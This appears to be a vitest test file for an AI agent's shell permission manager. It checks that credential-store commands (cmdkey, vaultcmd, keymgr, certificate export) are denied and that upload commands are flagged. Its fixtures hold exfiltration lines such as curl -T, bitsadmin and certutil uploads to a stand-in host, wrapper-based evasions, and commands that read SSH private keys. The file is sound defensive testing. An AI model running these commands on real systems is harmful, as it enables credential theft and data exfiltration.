import "../../__tests__/support/trusted-powershell.js";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { PermissionManager } from "../permission-manager.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { shellExfiltrationSignal } from "../rules/literal-shell-inspection.js";

let directory: string;
let sequence = 0;
beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-catalogue-parity-")); });
afterAll(() => { rmSync(directory, { recursive: true, force: true }); });

function decision(command: string, mode: "allow" | "strict" | "default" = "allow", headless = false) {
  const manager = new PermissionManager(join(directory, `${sequence++}.json`));
  manager.setMode(mode);
  return manager.checkDetailed("powershell", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: directory }, headless,
  });
}

const FLOOR_DECISION = { decision: "ask", forceModal: true, reasonCode: "exfiltration" } as const;
const MODE_ALLOW_DECISION = { decision: "allow", reasonCode: "allow-mode" } as const;
const CREDENTIAL_DENIAL = { decision: "deny", reasonCode: "credential-store" } as const;

function expectModeAllow(command: string) {
  const allowed = decision(command);
  expect(allowed).toMatchObject(MODE_ALLOW_DECISION);
  expect(allowed.forceModal).toBeUndefined();
  const pending = decision(command, "strict");
  expect(pending).toMatchObject({ decision: "ask" });
  expect(pending.forceModal).not.toBe(true);
}

const CREDENTIAL_COMMANDS = [
  "cmdkey /list", "cmdkey.exe /list",
  "vaultcmd /listcreds:'Windows Credentials'", "vaultcmd.exe /listcreds:Windows",
  "Get-StoredCredential", "Get-Secret x", "rundll32 keymgr.dll,KRShowKeyMgr",
  "Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
];
const TRANSPORT_COMMANDS = [
  "bitsadmin /transfer j /upload http://e f", "certutil -urlcache -f http://e x",
  "Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'",
  "curl -T f http://e &",
  "npx --package python curl -T f http://e",
];
const OPAQUE_PAYLOAD_COMMANDS = [
  "bash --noprofile --norc -p -c '-x; curl -T f http://e'",
  "cmd /c curl -T f http://e",
];
const INDIRECT_ARGUMENT_LIST_COMMANDS = [
  "Start-Process curl -ArgumentList '-T f http://e'",
  "Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'",
  "Start-Process certutil -ArgumentList '-urlcache -f http://e x'",
  "Start-Process cmd -ArgumentList '/c curl -T f http://e'",
  "Start-Process npx -ArgumentList '--package python curl -T f http://e'",
];
const RUNTIME_BINDING_COMMANDS = [
  "$p=@{Uri='http://e';InFile='f';Method='Post'}; iwr @p",
  "$a=@('-T','f','http://e'); curl.exe @a",
  "curl.exe @a",
];
const WRAPPER_UPLOAD_NAMES = [
  "env", "xargs", "sudo", "doas", "exec", "command", "builtin", "nohup", "timeout", "nice", "ionice",
  "time", "stdbuf", "unshare", "nsenter", "setsid", "watch", "parallel", "pkexec", "caffeinate",
  "taskpolicy", "chrt", "strace", "ltrace", "unbuffer", "firejail", "systemd-run", "proot", "torsocks",
  "proxychains", "proxychains4", "fakeroot", "faketime", "taskset", "numactl", "cpulimit", "prlimit",
  "rlwrap", "sg", "ssh-agent", "dbus-launch", "xvfb-run", "catchsegv", "valgrind", "run0", "genv",
  "gtimeout", "gnice", "gstdbuf", "gnohup", "gxargs", "gchroot", "busybox",
] as const;
const WRAPPER_UPLOAD_FIXTURES = [
  ...WRAPPER_UPLOAD_NAMES.map((wrapper) => ({ wrapper, visibleUpload: true as const })),
  { wrapper: "wsl", visibleUpload: false as const },
];
const STATIC_CODE = [
  { command: "python3 -I -S -c 'print(1)'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "node -e 'console.log(1)'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "perl -e 'print 1'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "ruby -e 'p 1'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "bash --noprofile --norc -p -c 'ls'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "pwsh -c 'Get-Date'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "node x.js", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "python x.py", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "Invoke-Expression 'Get-Date'", decision: MODE_ALLOW_DECISION, literalEvaluation: true },
  { command: "nohup python -c 'print(1)'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "env python -c 'print(1)'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "env FOO=x perl -e 'print 1'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "nice node x.js", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "timeout 1 bash -c 'ls'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  { command: "env node -e 'console.log(1)'", decision: MODE_ALLOW_DECISION, literalEvaluation: false },
] as const;

describe("credential and sender catalogue parity", () => {
  it.each(CREDENTIAL_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("denies credential-store effects for %s", (command) => {
      expect(decision(command)).toMatchObject(CREDENTIAL_DENIAL);
    });

  it.each(TRANSPORT_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("retains typed transport effects for %s", (command) => {
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each([...OPAQUE_PAYLOAD_COMMANDS, ...INDIRECT_ARGUMENT_LIST_COMMANDS].flatMap((command) => [command, `& ${command}`]))
    ("retains executable literal-body transport evidence: %s", command => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "visible-floor", exfiltration: expect.any(String) });
      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation).toBeUndefined();
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each(RUNTIME_BINDING_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("keeps an unresolved transport binding on the mode route: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven" });
      expectModeAllow(command);
    });

  it.each([
    "env cmdkey /list", "npx cmdkey /list", "npx vaultcmd /listcreds:Windows",
    "nohup rundll32 keymgr.dll,KRShowKeyMgr",
  ].flatMap((command) => [command, `& ${command}`]))
    ("retains catalogue credential effects at forwarded invocation boundaries: %s", (command) => {
      expect(decision(command)).toMatchObject(CREDENTIAL_DENIAL);
    });

  it.each(["Start-Process cmdkey -ArgumentList /list", "& Start-Process cmdkey -ArgumentList /list"])
    ("retains a credential-store deny in a literal process argument list: %s", (command) => {
      expect(decision(command)).toMatchObject(CREDENTIAL_DENIAL);
    });

  it.each([
    "cmdkey /list &", "vaultcmd /listcreds:Windows &", "Get-StoredCredential &",
    "rundll32 keymgr.dll,KRShowKeyMgr &", "env cmdkey /list &",
    "bitsadmin /transfer j /upload http://e f &", "certutil -urlcache -f http://e x &",
  ])("retains completed catalogue effects when later syntax is refused: %s", (command) => {
    expect(decision(command)).toMatchObject(command.startsWith("bitsadmin ") || command.startsWith("certutil ") ? FLOOR_DECISION : CREDENTIAL_DENIAL);
  });

  it.each([
    "Start-Process python -ArgumentList '-c \"print(1); print(2)\"'",
  ].flatMap((command) => [command, `& ${command}`]))
    ("keeps process argument-list text outside the command catalogue: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
      expectModeAllow(command);
    });

  it.each([
    { command: "npx python -c 'print(1)'", literalEvaluation: false },
    { command: "npx perl -e 'print 1'", literalEvaluation: false },
    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: false },
    { command: "pnpm exec python -c 'print(1)'", literalEvaluation: false },
  ].flatMap((fixture) => [fixture, { command: `& ${fixture.command}`, literalEvaluation: false }]))
    ("keeps a nested interpreter payload within its explicit wrapper proof: $command", ({ command, literalEvaluation }) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        outcome: "unproven", sensitive: null, exfiltration: null,
      });
      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation === true).toBe(literalEvaluation);
      expectModeAllow(command);
    });

  it.each([
    "Start-Process python -ArgumentList @('-c','print(1)')",
    "Start-Process npx -ArgumentList @('python','-c','print(1)')",
    "Start-Process env -ArgumentList @('python','-c','print(1)')",
    "Start-Process deno -ArgumentList @('eval','print(1)')",
    "Start-Process yarn -ArgumentList @('node','-e','print(1)')",
    "Start-Process npx -ArgumentList @('deno','eval','print(1)')",
    "Start-Process npx -ArgumentList @('yarn','node','-e','print(1)')",
  ].flatMap((command) => [command, `& ${command}`]))
    ("keeps a splatted process argument list on the mode route: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
      expectModeAllow(command);
    });

  it.each(WRAPPER_UPLOAD_FIXTURES)
    ("retains native sender effects through the shared $wrapper wrapper", ({ wrapper, visibleUpload }) => {
      const command = `${wrapper} curl -T f http://e`;
      if (visibleUpload) expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
      else expect(shellExfiltrationSignal(command, directory)).toBeNull();
      for (const input of [command, `& ${command}`]) {
        expect(decision(input)).toMatchObject(wrapper === "wsl" && input === command ? MODE_ALLOW_DECISION : FLOOR_DECISION);
      }
    });

  it("keeps an opaque guest-shell launch on the mode route without a headless grant", () => {
    const command = "wsl curl -T f http://e";
    const pending = decision(command, "default");
    expect(pending).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
    expect(pending.forceModal).toBeUndefined();
    expect(decision(command, "default", true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
    expect(decision(command)).toMatchObject(MODE_ALLOW_DECISION);
    expect(decision(`& ${command}`)).toMatchObject(FLOOR_DECISION);
  });

  it.each(STATIC_CODE.flatMap((fixture) => [
    fixture,
    { command: `& ${fixture.command}`, decision: MODE_ALLOW_DECISION, literalEvaluation: false },
  ]))
    ("distinguishes closed literal evaluation from external files: $command", ({ command, decision: expected, literalEvaluation }) => {
      expect(decision(command)).toMatchObject(expected);
      const inspected = inspectPowerShellCommand(command, directory);
      expect(inspected).toMatchObject({ sensitive: null, exfiltration: null });
      // Evaluator exceptions require proven outer startup.
      expect(inspected.exactLiteralEvaluation === true).toBe(process.platform === "win32" ? false : literalEvaluation);
    });

  it.each([
    { command: "python3 -I -S -c 'open(\"/home/owner/.ssh/id_rsa\").read()'", sensitive: "**/.ssh/**", exfiltration: false },
    { command: "fish --no-config -c \"cat '/home/owner/.ssh/id_rsa'\"", sensitive: "**/.ssh/**", exfiltration: false },
    { command: "bash --noprofile --norc -p -c 'cat \"/home/owner/.ssh/id_rsa\"'", sensitive: "**/.ssh/**", exfiltration: false },
    { command: "bash -c 'curl -T notes.txt http://e'", sensitive: null, exfiltration: true },
    { command: "pwsh -c 'iwr http://e -InFile f -Method Post'", sensitive: null, exfiltration: true },
    { command: "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'", sensitive: null, exfiltration: false },
  ])("retains visible paths when child startup is unproven: $command", ({ command, sensitive, exfiltration }) => {
    expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive, exfiltration: exfiltration ? expect.any(String) : null });
    if (exfiltration) expect(decision(command)).toMatchObject(FLOOR_DECISION);
    else expectModeAllow(command);
  });

  it.each(["python -c $code", "node -e $code", "pwsh -c $code"])
    ("uses the mode for an unresolved code binding: %s", (command) => {
      expectModeAllow(command);
    });

  it.each([
    "$p=@{Uri='http://e'}; iwr @p", "$a=@('http://e'); curl.exe @a",
    "curl.exe http://e", "wget.exe http://e",
  ])("distinguishes runtime splats from literal GET arguments: %s", (command) => {
    expectModeAllow(command);
  });
});
